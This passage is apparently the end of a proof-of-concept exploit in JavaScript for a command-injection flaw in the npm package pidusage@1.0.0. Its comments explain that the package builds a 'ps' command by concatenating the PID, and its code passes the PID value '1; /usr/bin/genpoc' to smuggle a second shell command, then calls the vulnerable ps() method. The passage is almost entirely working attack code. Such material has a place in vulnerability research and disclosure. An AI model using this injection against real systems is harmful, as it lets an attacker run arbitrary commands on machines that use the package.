   // The vulnerable implementation constructs a shell command by naively concatenating the PID:
   // 'ps -o pcpu,rss -p <PID>'
   // Since no type checking or sanitization is applied to the PID input, we can inject shell metacharacters.
   const injectedPid = "1; /usr/bin/genpoc";

   // In pidusage@1.0.0, ps() is an instance method on the stats object returned by the main export. 
   // Instantiating first correctly targets the vulnerable prototype in this version and avoids runtime TypeError.
   const stat = pidusage(1);

   await stat.ps(injectedPid);
}

await exploit();
